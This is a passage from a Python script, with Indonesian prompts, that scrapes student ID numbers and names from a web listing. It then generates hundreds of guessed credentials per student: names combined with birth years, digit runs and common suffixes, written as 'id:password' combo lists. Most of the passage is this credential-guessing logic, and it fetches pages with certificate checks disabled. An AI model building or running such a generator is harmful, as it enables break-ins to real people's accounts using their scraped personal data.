					o_.write(__+':'+x[1].lower()+'\n')
					o_.write(__+':'+x[2].lower()+'\n')
					o_.write(__+':'+x[1].lower()+'01\n')
					o_.write(__+':'+x[1].lower()+'02\n')
					o_.write(__+':'+x[1].lower()+'03\n')
					o_.write(__+':'+x[1].lower()+'04\n')
					o_.write(__+':'+x[1].lower()+'05\n')
					o_.write(__+':'+x[1].lower()+'06\n')
					o_.write(__+':'+x[1].lower()+x[2].lower()+'\n')
					o_.write(__+':'+x[1].lower()+x[2].lower()+'\n')
					o_.write(__+':'+x[1].lower()+x[2].lower()+'1\n')
					o_.write(__+':'+x[1].lower()+x[2].lower()+'12\n')
					o_.write(__+':'+x[1].lower()+x[2].lower()+'123\n')
					o_.write(__+':'+x[1].lower()+x[2].lower()+'1234\n')
					o_.write(__+':'+x[1].lower()+x[2].lower()+'12345\n')
					o_.write(__+':'+x[1].lower()+'123\n')
					o_.write(__+':'+x[1].lower()+'123\n')
					o_.write(__+':'+x[1].lower()+'1234\n')
					o_.write(__+':'+x[1].lower()+'12345\n')
					o_.write(__+':'+x[1].lower()+'123456\n')
					o_.write(__+':'+x[1].lower()+'1234567\n')
					o_.write(__+':'+x[1].lower()+'12345678\n')
					o_.write(__+':'+x[1].lower()+'123456789\n')
					o_.write(__+':'+x[1].lower()+'2000\n')
					o_.write(__+':'+x[1].lower()+'1995\n')
					o_.write(__+':'+x[1].lower()+'1992\n')
					o_.write(__+':'+x[1].lower()+'1993\n')
					o_.write(__+':'+x[1].lower()+'1996\n')
					o_.write(__+':'+x[1].lower()+'1997\n')
					o_.write(__+':'+x[1].lower()+'1991\n')
					o_.write(__+':'+x[1].lower()+'1994\n')
					o_.write(__+':'+x[1].lower()+'1998\n')
					o_.write(__+':'+x[1].lower()+'1999\n')
					#o_.write(__+':'+x[2].lower()+cok+'\n')
					#o_.write(__+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+__+'\n')
		done(_2)
	elif _0 == 'c':
		_2 = input(f"{off}{cyan}[+]{off}Nama Output {cyan}[{off}nama+.txt{cyan}] {off}: ")
		for _ in range(int(_3)):
			print(f"{yellow}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(__+':'+x[0].title()+'1990\n')
					o_.write(__+':'+x[0].title()+'1991\n')
					o_.write(__+':'+x[0].title()+'1992\n')
					o_.write(__+':'+x[0].title()+'1993\n')
					o_.write(__+':'+x[0].title()+'1994\n')
					o_.write(__+':'+x[0].title()+'1995\n')
					o_.write(__+':'+x[0].title()+'1996\n')
					o_.write(__+':'+x[0].title()+'1997\n')
					o_.write(__+':'+x[0].title()+'1998\n')
					o_.write(__+':'+x[0].title()+'1999\n')
					o_.write(__+':'+x[0].title()+'2000\n')
					o_.write(__+':'+x[0].title()+'2001\n')
					o_.write(__+':'+x[0].title()+'2002\n')
					o_.write(__+':'+x[0].title()+'2003\n')
					o_.write(__+':'+x[0].title()+'2005\n')
					o_.write(__+':'+x[0].title()+'2004\n')
					o_.write(__+':'+x[0].title()+'2006\n')
					o_.write(__+':'+x[0].title()+'2007\n')
					o_.write(__+':'+x[0].title()+'2008\n')
					o_.write(__+':'+x[0].title()+'2009\n')
					o_.write(__+':'+x[0].title()+'2010\n')
					o_.write(__+':'+x[0].title()+'2011\n')
					o_.write(__+':'+x[0].title()+'2012\n')
					o_.write(__+':'+x[0].title()+'2013\n')
					o_.write(__+':'+x[0].title()+'2014\n')
					o_.write(__+':'+x[0].title()+'2015\n')
					o_.write(__+':'+x[0].title()+'2016\n')
					o_.write(__+':'+x[0].title()+'2017\n')
					o_.write(__+':'+x[0].title()+'2018\n')
					o_.write(__+':'+x[0].title()+'2019\n')
					o_.write(__+':'+x[0].title()+'2020\n')
					o_.write(__+':'+x[0].title()+'00\n')
					o_.write(__+':'+x[0].title()+'01\n')
					o_.write(__+':'+x[0].title()+'02\n')
					o_.write(__+':'+x[0].title()+'03\n')
					o_.write(__+':'+x[0].title()+'04\n')
					o_.write(__+':'+x[0].title()+'05\n')
					o_.write(__+':'+x[0].title()+'06\n')
					o_.write(__+':'+x[0].title()+'07\n')
					o_.write(__+':'+x[0].title()+'08\n')
					o_.write(__+':'+x[0].title()+'09\n')
					o_.write(__+':'+x[0].title()+'001\n')
					o_.write(__+':'+x[0].title()+'002\n')
					o_.write(__+':'+x[0].title()+'003\n')
					o_.write(__+':'+x[0].title()+'004\n')
					o_.write(__+':'+x[0].title()+'005\n')
					o_.write(__+':'+x[0].title()+'006\n')
					o_.write(__+':'+x[0].title()+'007\n')
					o_.write(__+':'+x[0].title()+'1\n')
					o_.write(__+':'+x[0].title()+'2\n')
					o_.write(__+':'+x[0].title()+'3\n')
					o_.write(__+':'+x[0].title()+'4\n')
					o_.write(__+':'+x[0].title()+'5\n')
					o_.write(__+':'+x[0].title()+'6\n')
					o_.write(__+':'+x[0].title()+'7\n')
					o_.write(__+':'+x[0].title()+'8\n')
					o_.write(__+':'+x[0].title()+'9\n')
					o_.write(__+':'+x[0].title()+'10\n')
					o_.write(__+':'+x[0].title()+'11\n')
					o_.write(__+':'+x[0].title()+'12\n')
					o_.write(__+':'+x[0].title()+'13\n')
					o_.write(__+':'+x[0].title()+'14\n')
					o_.write(__+':'+x[0].title()+'15\n')
					o_.write(__+':'+x[0].title()+'16\n')
					o_.write(__+':'+x[0].title()+'17\n')
					o_.write(__+':'+x[0].title()+'18\n')
					o_.write(__+':'+x[0].title()+'19\n')
					o_.write(__+':'+x[0].title()+'20\n')
					o_.write(__+':'+x[0].title()+'21\n')
					o_.write(__+':'+x[0].title()+'22\n')
					o_.write(__+':'+x[0].title()+'23\n')
					o_.write(__+':'+x[0].title()+'24\n')
					o_.write(__+':'+x[0].title()+'25\n')
					o_.write(__+':'+x[0].title()+'26\n')
					o_.write(__+':'+x[0].title()+'27\n')
					o_.write(__+':'+x[0].title()+'28\n')
					o_.write(__+':'+x[0].title()+'29\n')
					o_.write(__+':'+x[0].title()+'30\n')
					o_.write(__+':'+x[0].title()+'31\n')
					o_.write(__+':'+x[0].title()+'32\n')
					o_.write(__+':'+x[0].title()+'33\n')
					o_.write(__+':'+x[0].title()+'34\n')
					o_.write(__+':'+x[0].title()+'35\n')
					o_.write(__+':'+x[0].title()+'36\n')
					o_.write(__+':'+x[0].title()+'37\n')
					o_.write(__+':'+x[0].title()+'38\n')
					o_.write(__+':'+x[0].title()+'39\n')
					o_.write(__+':'+x[0].title()+'40\n')
					o_.write(__+':'+x[0].title()+'41\n')
					o_.write(__+':'+x[0].title()+'42\n')
					o_.write(__+':'+x[0].title()+'43\n')
					o_.write(__+':'+x[0].title()+'44\n')
					o_.write(__+':'+x[0].title()+'45\n')
					o_.write(__+':'+x[0].title()+'46\n')
					o_.write(__+':'+x[0].title()+'47\n')
					o_.write(__+':'+x[0].title()+'48\n')
					o_.write(__+':'+x[0].title()+'49\n')
					o_.write(__+':'+x[0].title()+'50\n')
					o_.write(__+':'+x[0].title()+'51\n')
					o_.write(__+':'+x[0].title()+'52\n')
					o_.write(__+':'+x[0].title()+'53\n')
					o_.write(__+':'+x[0].title()+'54\n')
					o_.write(__+':'+x[0].title()+'55\n')
					o_.write(__+':'+x[0].title()+'56\n')
					o_.write(__+':'+x[0].title()+'57\n')
					o_.write(__+':'+x[0].title()+'58\n')
					o_.write(__+':'+x[0].title()+'59\n')
					o_.write(__+':'+x[0].title()+'60\n')
					o_.write(__+':'+x[0].title()+'61\n')
					o_.write(__+':'+x[0].title()+'62\n')
					o_.write(__+':'+x[0].title()+'63\n')
					o_.write(__+':'+x[0].title()+'64\n')
					o_.write(__+':'+x[0].title()+'65\n')
					o_.write(__+':'+x[0].title()+'66\n')
					o_.write(__+':'+x[0].title()+'67\n')
					o_.write(__+':'+x[0].title()+'68\n')
					o_.write(__+':'+x[0].title()+'69\n')
					o_.write(__+':'+x[0].title()+'70\n')
					o_.write(__+':'+x[0].title()+'71\n')
					o_.write(__+':'+x[0].title()+'72\n')
					o_.write(__+':'+x[0].title()+'73\n')
					o_.write(__+':'+x[0].title()+'74\n')
					o_.write(__+':'+x[0].title()+'75\n')
					o_.write(__+':'+x[0].title()+'76\n')
					o_.write(__+':'+x[0].title()+'77\n')
					o_.write(__+':'+x[0].title()+'78\n')
					o_.write(__+':'+x[0].title()+'79\n')
					o_.write(__+':'+x[0].title()+'80\n')
					o_.write(__+':'+x[0].title()+'81\n')
					o_.write(__+':'+x[0].title()+'82\n')
					o_.write(__+':'+x[0].title()+'83\n')
					o_.write(__+':'+x[0].title()+'84\n')
					o_.write(__+':'+x[0].title()+'85\n')
					o_.write(__+':'+x[0].title()+'86\n')
					o_.write(__+':'+x[0].title()+'87\n')
					o_.write(__+':'+x[0].title()+'88\n')
					o_.write(__+':'+x[0].title()+'89\n')
					o_.write(__+':'+x[0].title()+'90\n')
					o_.write(__+':'+x[0].title()+'91\n')
					o_.write(__+':'+x[0].title()+'92\n')
					o_.write(__+':'+x[0].title()+'93\n')
					o_.write(__+':'+x[0].title()+'94\n')
					o_.write(__+':'+x[0].title()+'95\n')
					o_.write(__+':'+x[0].title()+'96\n')
					o_.write(__+':'+x[0].title()+'97\n')
					o_.write(__+':'+x[0].title()+'98\n')
					o_.write(__+':'+x[0].title()+'99\n')
					o_.write(__+':'+x[0].title()+'100\n')
					o_.write(__+':'+x[0].title()+'1990\n')
					o_.write(__+':'+x[0].title()+'1991\n')
					o_.write(__+':'+x[0].title()+'1992\n')
					o_.write(__+':'+x[0].title()+'1993\n')
					o_.write(__+':'+x[0].title()+'1994\n')
					o_.write(__+':'+x[0].title()+'1995\n')
					o_.write(__+':'+x[0].title()+'1996\n')
					o_.write(__+':'+x[0].title()+'1997\n')
					o_.write(__+':'+x[0].title()+'1998\n')
					o_.write(__+':'+x[0].title()+'1999\n')
					o_.write(__+':'+x[0].title()+'2000\n')
					o_.write(__+':'+x[0].title()+'2001\n')
					o_.write(__+':'+x[0].title()+'2002\n')
					o_.write(__+':'+x[0].title()+'2003\n')
					o_.write(__+':'+x[0].title()+'2005\n')
					o_.write(__+':'+x[0].title()+'2004\n')
					o_.write(__+':'+x[0].title()+'2006\n')
					o_.write(__+':'+x[0].title()+'2007\n')
					o_.write(__+':'+x[0].title()+'2008\n')
					o_.write(__+':'+x[0].title()+'2009\n')
					o_.write(__+':'+x[0].title()+'2010\n')
					o_.write(__+':'+x[0].title()+'2011\n')
					o_.write(__+':'+x[0].title()+'2012\n')
					o_.write(__+':'+x[0].title()+'2013\n')
					o_.write(__+':'+x[0].title()+'2014\n')
					o_.write(__+':'+x[0].title()+'2015\n')
					o_.write(__+':'+x[0].title()+'2016\n')
					o_.write(__+':'+x[0].title()+'2017\n')
					o_.write(__+':'+x[0].title()+'2018\n')
					o_.write(__+':'+x[0].title()+'2019\n')
					o_.write(__+':'+x[0].title()+'2020\n')
					o_.write(__+':'+x[1].title()+'00\n')
					o_.write(__+':'+x[1].title()+'01\n')
					o_.write(__+':'+x[1].title()+'02\n')
					o_.write(__+':'+x[1].title()+'03\n')
					o_.write(__+':'+x[1].title()+'04\n')
					o_.write(__+':'+x[1].title()+'05\n')
					o_.write(__+':'+x[1].title()+'06\n')
					o_.write(__+':'+x[1].title()+'07\n')
					o_.write(__+':'+x[1].title()+'08\n')
					o_.write(__+':'+x[1].title()+'09\n')
					o_.write(__+':'+x[1].title()+'001\n')
					o_.write(__+':'+x[1].title()+'002\n')
					o_.write(__+':'+x[1].title()+'003\n')
					o_.write(__+':'+x[1].title()+'004\n')
					o_.write(__+':'+x[1].title()+'005\n')
					o_.write(__+':'+x[1].title()+'006\n')
					o_.write(__+':'+x[1].title()+'007\n')
					o_.write(__+':'+x[1].title()+'1\n')
					o_.write(__+':'+x[1].title()+'2\n')
					o_.write(__+':'+x[1].title()+'3\n')
					o_.write(__+':'+x[1].title()+'4\n')
					o_.write(__+':'+x[1].title()+'5\n')
					o_.write(__+':'+x[1].title()+'6\n')
					o_.write(__+':'+x[1].title()+'7\n')
					o_.write(__+':'+x[1].title()+'8\n')
					o_.write(__+':'+x[1].title()+'9\n')
					o_.write(__+':'+x[1].title()+'10\n')
					o_.write(__+':'+x[1].title()+'11\n')
					o_.write(__+':'+x[1].title()+'12\n')
					o_.write(__+':'+x[1].title()+'13\n')
					o_.write(__+':'+x[1].title()+'14\n')
					o_.write(__+':'+x[1].title()+'15\n')
					o_.write(__+':'+x[1].title()+'16\n')
					o_.write(__+':'+x[1].title()+'17\n')
					o_.write(__+':'+x[1].title()+'18\n')
					o_.write(__+':'+x[1].title()+'19\n')
					o_.write(__+':'+x[1].title()+'20\n')
					o_.write(__+':'+x[1].title()+'21\n')
					o_.write(__+':'+x[1].title()+'22\n')
					o_.write(__+':'+x[1].title()+'23\n')
					o_.write(__+':'+x[1].title()+'24\n')
					o_.write(__+':'+x[1].title()+'25\n')
					o_.write(__+':'+x[1].title()+'26\n')
					o_.write(__+':'+x[1].title()+'27\n')
					o_.write(__+':'+x[1].title()+'28\n')
					o_.write(__+':'+x[1].title()+'29\n')
					o_.write(__+':'+x[1].title()+'30\n')
					o_.write(__+':'+x[1].title()+'31\n')
					o_.write(__+':'+x[1].title()+'32\n')
					o_.write(__+':'+x[1].title()+'33\n')
					o_.write(__+':'+x[1].title()+'34\n')
					o_.write(__+':'+x[1].title()+'35\n')
					o_.write(__+':'+x[1].title()+'36\n')
					o_.write(__+':'+x[1].title()+'37\n')
					o_.write(__+':'+x[1].title()+'38\n')
					o_.write(__+':'+x[1].title()+'39\n')
					o_.write(__+':'+x[1].title()+'40\n')
					o_.write(__+':'+x[1].title()+'41\n')
					o_.write(__+':'+x[1].title()+'42\n')
					o_.write(__+':'+x[1].title()+'43\n')
					o_.write(__+':'+x[1].title()+'44\n')
					o_.write(__+':'+x[1].title()+'45\n')
					o_.write(__+':'+x[1].title()+'46\n')
					o_.write(__+':'+x[1].title()+'47\n')
					o_.write(__+':'+x[1].title()+'48\n')
					o_.write(__+':'+x[1].title()+'49\n')
					o_.write(__+':'+x[1].title()+'50\n')
					o_.write(__+':'+x[1].title()+'51\n')
					o_.write(__+':'+x[1].title()+'52\n')
					o_.write(__+':'+x[1].title()+'53\n')
					o_.write(__+':'+x[1].title()+'54\n')
					o_.write(__+':'+x[1].title()+'55\n')
					o_.write(__+':'+x[1].title()+'56\n')
					o_.write(__+':'+x[1].title()+'57\n')
					o_.write(__+':'+x[1].title()+'58\n')
					o_.write(__+':'+x[1].title()+'59\n')
					o_.write(__+':'+x[1].title()+'60\n')
					o_.write(__+':'+x[1].title()+'61\n')
					o_.write(__+':'+x[1].title()+'62\n')
					o_.write(__+':'+x[1].title()+'63\n')
					o_.write(__+':'+x[1].title()+'64\n')
					o_.write(__+':'+x[1].title()+'65\n')
					o_.write(__+':'+x[1].title()+'66\n')
					o_.write(__+':'+x[1].title()+'67\n')
					o_.write(__+':'+x[1].title()+'68\n')
					o_.write(__+':'+x[1].title()+'69\n')
					o_.write(__+':'+x[1].title()+'70\n')
					o_.write(__+':'+x[1].title()+'71\n')
					o_.write(__+':'+x[1].title()+'72\n')
					o_.write(__+':'+x[1].title()+'73\n')
					o_.write(__+':'+x[1].title()+'74\n')
					o_.write(__+':'+x[1].title()+'75\n')
					o_.write(__+':'+x[1].title()+'76\n')
					o_.write(__+':'+x[1].title()+'77\n')
					o_.write(__+':'+x[1].title()+'78\n')
					o_.write(__+':'+x[1].title()+'79\n')
					o_.write(__+':'+x[1].title()+'80\n')
					o_.write(__+':'+x[1].title()+'81\n')
					o_.write(__+':'+x[1].title()+'82\n')
					o_.write(__+':'+x[1].title()+'83\n')
					o_.write(__+':'+x[1].title()+'84\n')
					o_.write(__+':'+x[1].title()+'85\n')
					o_.write(__+':'+x[1].title()+'86\n')
					o_.write(__+':'+x[1].title()+'87\n')
					o_.write(__+':'+x[1].title()+'88\n')
					o_.write(__+':'+x[1].title()+'89\n')
					o_.write(__+':'+x[1].title()+'90\n')
					o_.write(__+':'+x[1].title()+'91\n')
					o_.write(__+':'+x[1].title()+'92\n')
					o_.write(__+':'+x[1].title()+'93\n')
					o_.write(__+':'+x[1].title()+'94\n')
					o_.write(__+':'+x[1].title()+'95\n')
					o_.write(__+':'+x[1].title()+'96\n')
					o_.write(__+':'+x[1].title()+'97\n')
					o_.write(__+':'+x[1].title()+'98\n')
					o_.write(__+':'+x[1].title()+'99\n')
					o_.write(__+':'+x[1].title()+'100\n')
					#o_.write(__+':'+x[2].lower()+'\n')
					#o_.write(__+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+__+'\n')
		done(_2)
		
	elif _0 == 'd':
		_2 = input(f"{off}{cyan}[+]{off}Nama Output {cyan}[{off}nama+.txt{cyan}] {off}: ")
		for _ in range(int(_3)):
			print(f"{yellow}Tunggu scan selesai .......{off}")
			collect(f'{_1}/{_*20}')
		for _ in range(len(xtc)):
			__ = json.loads(json.dumps(xtc[_]))['nim']
			___ = json.loads(json.dumps(xtc[_]))['nama']
			try:
				x = ___.split(' ')
				with open(_2,'a') as o_:
					o_.write(x[0].lower()+':'+'1234567\n')
					o_.write(x[0].lower()+':'+'12345678\n')
					o_.write(x[0].lower()+':'+'123456789\n')
					o_.write(x[0].lower()+':'+'123456789\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'01\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'02\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'03\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'04\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'05\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'06\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'07\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'08\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'09\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'1\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'2\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'3\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'4\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'5\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'6\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'7\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'8\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'9\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'10\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'11\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'12\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'13\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'15\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'14\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'16\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'17\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'18\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'19\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'20\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'21\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'22\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'23\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'24\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'25\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'26\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'27\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'28\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'29\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'30\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'31\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'32\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'33\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'34\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'35\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'36\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'37\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'38\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'39\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'40\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'41\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'42\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'43\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'44\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'45\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'46\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'47\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'48\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'49\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'50\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'1000\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'2000\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'2020\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'0202\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'007\n' )
					o_.write(x[0].lower()+':'+x[0].lower()+'0001\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'002\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'003\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'123\n')
					o_.write(x[0].lower()+':'+x[0].lower()+'1234\n')
					#o_.write(x[0].lower()+':'+x[0].lower()+'\n')
					#o_.write(__+':'+__+'\n')
			except:
				with open(_2,'a') as o_:
					o_.write(__+':'+__+'\n')
		done(_2)
	
		
	
	
	else:
		exit(f"{red}Jangan lupa coli..{off}")
		
	
		
def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		xtc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:7]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _

def done(_2):
	print(f"{green}[{white}✓{green}]{off}Hasil sudah tersimpan {green} {off}")
			


if __name__ == '__main__':
    
    main()

